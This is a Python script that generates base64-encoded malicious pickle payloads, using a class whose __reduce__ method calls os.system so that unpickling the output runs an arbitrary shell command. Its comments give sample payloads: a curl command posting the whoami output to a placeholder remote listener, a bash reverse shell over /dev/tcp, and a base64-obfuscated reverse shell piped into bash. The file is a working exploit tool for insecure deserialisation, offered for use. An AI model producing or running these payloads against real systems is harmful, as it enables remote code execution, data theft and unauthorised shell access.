#!/usr/bin/python

import os, sys, pickle, argparse
from base64 import b64encode, b64decode

# fun things to pickle:
# ./pickling.py "curl -X POST -d \"$(whoami)\" http://<REMOTE-LISTNER>/funtimes"
# ./pickling.py "bash -i >& /dev/tcp/<REMOTE-LISTNER>/8080 0>&1"
# ./pickling.py "echo $(echo -n "bash -i >& /dev/tcp/<REMOTE-LISTNER>/443 0>&1" | base64) | base64 -d | bash"


banner = """
               .      
 ,-. . ,-. . , |  ,-. 
 | | | |   |/  |  |-' 
 |-' ' `-' |\  `' `-' 
 |         ' `        
 '                    
"""
parser = argparse.ArgumentParser(description='This script is used to pickle system commands.')
parser.add_argument('command', action='store', metavar='os_command', help="operating system (OS) commands to run i.e. \"ls -al\"")

if len(sys.argv)==1:
    print( banner )
    parser.print_help()
    sys.exit(1)

options = parser.parse_args()

class PickleRick(object):
    def __reduce__(self):
        return (os.system,(options.command,))

print( b64encode(pickle.dumps(PickleRick())).decode("utf-8"))
